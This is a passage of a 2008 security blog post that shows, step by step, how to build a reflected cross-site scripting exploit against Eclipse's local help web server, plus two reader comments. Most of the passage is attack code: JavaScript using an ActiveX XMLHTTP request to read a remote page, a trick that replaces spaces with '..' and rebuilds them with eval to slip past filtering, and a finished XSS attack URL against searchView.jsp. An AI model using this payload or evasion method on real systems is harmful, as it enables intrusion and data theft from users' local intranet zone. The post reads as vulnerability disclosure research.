    var hr = new ActiveXObject("Msxml2.XMLHTTP");
    hr.onreadystatechange = function(){
       alert(hr.responseText);
    };
    hr.open("GET","http://www.google.com",true);
    hr.send(null);
}

setTimeout('f()',2000);
First of all, the "var" keyword is not needed. You can perform implicit variable declaration in Javascript. But what about the rest? What I did was get rid of all the whitespace that wasn't needed and came up with this:

function f(){hr=new ActiveXObject("Msxml2.XMLHTTP");hr.onreadystatechange=function(){
alert(hr.responseText);};hr.open("GET","http://www.google.com",true);hr.send(null);}
setTimeout('f()',2000);
That's pretty messy looking, but there are still spaces in there. What I did next was put that entire thing into a string and replaced the spaces with "..".

b="function..f(){hr=new..ActiveXObject("Msxml2.XMLHTTP");hr.onreadystatechange=
function(){alert(hr.responseText);};hr.open("GET","http://www.google.com",true);
hr.send(null);}setTimeout('f()',2000);";
But if you eval that string it's not going to work because of the ".." characters replacing the spaces. Just use the replace function!

b="function..f(){hr=new..ActiveXObject("Msxml2.XMLHTTP");hr.onreadystatechange=
function(){alert(hr.responseText);};hr.open("GET","http://www.google.com",true);
hr.send(null);}setTimeout('f()',2000);";
a=a.replace(/\.\./g,String.fromCharCode(32));
eval(a);
If we put it all together we have this as our XSS attack string:

http://127.0.0.1:55610/help/advanced/searchView.jsp?searchWord=a");}b="function..f
(){hr=new..ActiveXObject(\"Msxml2.XMLHTTP\");hr.onreadystatechange=function()..{
alert(hr.responseText);};hr.open(\"GET\",\"http://www.google.com\",true);hr.send
(null);}setTimeout('f()',2000);";b=b.replace(/\.\./g,String.fromCharCode(32));
eval(b);</script>
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyHViP93rRPaAbwp_B0XRP0aEkdGDVU8RG6CyU981auIqteklAEJVYWtrBWNYQ1xoVjpP1pO3xFxF_53fWDZ7NHndnRT6mDyFCfvviWQb_TW8mG0zgN75bHt0eEGFi-vISJDjh2g/s200/pwn3d.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyHViP93rRPaAbwp_B0XRP0aEkdGDVU8RG6CyU981auIqteklAEJVYWtrBWNYQ1xoVjpP1pO3xFxF_53fWDZ7NHndnRT6mDyFCfvviWQb_TW8mG0zgN75bHt0eEGFi-vISJDjh2g/s1600-h/pwn3d.png)

Labels: [computers](http://r00tin.blogspot.com/search/label/computers), [internet explorer](http://r00tin.blogspot.com/search/label/internet%20explorer), [local intranet zone](http://r00tin.blogspot.com/search/label/local%20intranet%20zone), [local web servers](http://r00tin.blogspot.com/search/label/local%20web%20servers), [localhost](http://r00tin.blogspot.com/search/label/localhost), [loopback](http://r00tin.blogspot.com/search/label/loopback), [security](http://r00tin.blogspot.com/search/label/security), [xss](http://r00tin.blogspot.com/search/label/xss)

*posted by Rob @ [1:32 PM](http://r00tin.blogspot.com/2008/04/eclipse-local-web-server-exploitation.html "permanent link")*
[2 comments](https://www.blogger.com/comment/fullpage/post/18737993/4580012300946114015)
[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/18737993/4580012300946114015 "Email Post")[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=18737993&postID=4580012300946114015&from=pencil "Edit Post")

#### 2 Comments:

At [7:38 AM](#c4296363483765387617 "comment permalink"),
![Anonymous](https://resources.blogblog.com/img/anon16-rounded.gif) Anonymous said...

I get "You are not authorized to access bug #223539" when I try to check the status of the bug. Do you know if the bug has been fixed in eclipse 3.4?

At [5:13 AM](#c8152106182155437644 "comment permalink"),
![Blogger](https://resources.blogblog.com/img/b16-rounded.gif) [Unknown](https://www.blogger.com/profile/01783865663884155509) said...

Did you find XSS only in these two URLs?

[Post a Comment](https://www.blogger.com/comment/fullpage/post/18737993/4580012300946114015)

[<< Home](http://r00tin.blogspot.com/)

---


